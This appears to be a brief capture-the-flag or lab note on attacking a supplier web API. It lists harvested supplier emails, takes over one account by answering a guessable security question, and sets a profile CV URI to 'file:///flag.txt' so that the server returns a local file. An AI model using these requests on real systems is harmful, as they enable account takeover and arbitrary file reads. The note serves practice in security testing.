___

# Customer
**Suppliers_GetAll**
securityQuestion": "What is your favorite color?"


```txt
P.Howard1536@globalsolutions.com
L.Walker1872@globalsolutions.com
T.Harris1814@globalsolutions.com
B.Rogers1535@globalsolutions.com
M.Alexander1650@globalsolutions.com
```


#### /api/v2/authentication/suppliers/passwords/resets/security-question-answers

![[Pasted image 20241003104105.png]]

```json
{
  "SupplierEmail": "B.Rogers1535@globalsolutions.com",
  "SecurityQuestionAnswer": "Rust",
  "NewPassword": "danidani"
}
```


# Suplier

#### POST /api/v2/suppliers/current-user/cv

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCVs/file-sample_150kB.pdf",
  "fileSize": 358443
}
```

#### /api/v2/suppliers/current-user

Use this endpoint to update the currently authenticated Supplier.

```json
{
  "SecurityQuestion": "test",
  "SecurityQuestionAnswer": "test",
  "ProfessionalCVPDFFileURI": "file:///flag.txt",
  "PhoneNumber": "test",
  "Password": "test"
}
```

#### GET /api/v2/suppliers/current-user/cv 

![[Pasted image 20241003104545.png]]